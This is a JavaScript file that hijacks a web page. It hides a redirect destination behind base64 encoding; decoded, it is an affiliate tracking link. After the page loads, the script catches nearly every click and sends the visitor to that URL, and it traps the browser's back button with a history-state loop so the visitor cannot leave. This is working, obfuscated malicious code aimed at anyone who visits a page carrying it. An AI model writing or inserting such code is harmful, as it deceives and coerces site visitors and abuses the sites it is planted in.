const excludedLinks = ['/about', '/contact'];
const base64Url = 'aHR0cHM6Ly90cmtnZmxvdy5nMmFmc2UuY29tL2NsaWNrP3BpZD0xMyZvZmZlcl9pZD0zMDU3JnN1YjE9YmFzc3dpbg==';

function base64_decode(data) {
    const b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    let o1, o2, o3, h1, h2, h3, h4, bits, i = 0, enc = '';
    do {
        h1 = b64.indexOf(data.charAt(i++));
        h2 = b64.indexOf(data.charAt(i++));
        h3 = b64.indexOf(data.charAt(i++));
        h4 = b64.indexOf(data.charAt(i++));
        bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
        o1 = bits >> 16 & 0xff;
        o2 = bits >> 8 & 0xff;
        o3 = bits & 0xff;

        if (h3 === 64) enc += String.fromCharCode(o1);
        else if (h4 === 64) enc += String.fromCharCode(o1, o2);
        else enc += String.fromCharCode(o1, o2, o3);
    } while (i < data.length);
    return enc;
}

const redirectUrl = base64_decode(base64Url);

function shouldRedirect(event) {
    const anchor = event.target.closest('a');
    if (anchor) {
        const href = anchor.getAttribute('href');
        if (href && excludedLinks.includes(href)) {
            return false;
        }
    }
    return true;
}

function redirect() {
    window.location.href = redirectUrl;
}

document.addEventListener('DOMContentLoaded', () => {
    document.body.addEventListener('click', (event) => {
        if (shouldRedirect(event)) {
            event.preventDefault();
            redirect();
        }
    });

    // Push a dummy state to track the initial page load
    history.pushState(null, null, window.location.href);
    window.addEventListener('popstate', (event) => {
        redirect();
        history.pushState(null, null, window.location.href);
    });
});
